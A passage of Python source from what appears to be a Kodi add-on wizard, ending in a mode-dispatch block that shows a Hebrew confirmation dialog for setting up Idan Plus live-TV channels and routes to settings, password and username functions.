        iptvkodi17_18 ()#line:6936
    else :#line:6938
     sys .exit ()#line:6939
elif mode =='simpleidanplus':#line:6941
    DIALOG =xbmcgui .Dialog ()#line:6942
    choice =DIALOG .yesno (ADDONTITLE ,"האם תרצה להגדיר את ערוצי עידן פלוס בטלוויזיה חיה? שימו לב זה ימחק לכם את מנוי ה IPTV שלכם",yeslabel ="[B][COLOR WHITE]כן[/COLOR][/B]",nolabel ="[B][COLOR white]לא[/COLOR][/B]")#line:6943
    if choice ==1 :#line:6944
        iptvidanplus ()#line:6945
    else :#line:6947
     sys .exit ()#line:6948
elif mode =='update_tele':updatetelemedia (NOTEID )#line:6950
elif mode =='adv_settings':buffer1 ()#line:6951
elif mode =='getpass':getpass ()#line:6952
elif mode =='setpass':setpass ()#line:6953
elif mode =='setuname':setuname ()#line:6954
elif mode =='passandUsername':passandUsername ()#line:6955
elif mode =='9':disply_hwr ()#line:6956
elif mode =='99':disply_hwr2 ()#line:6957
xbmcplugin .endOfDirectory (int (sys .argv [1 ]))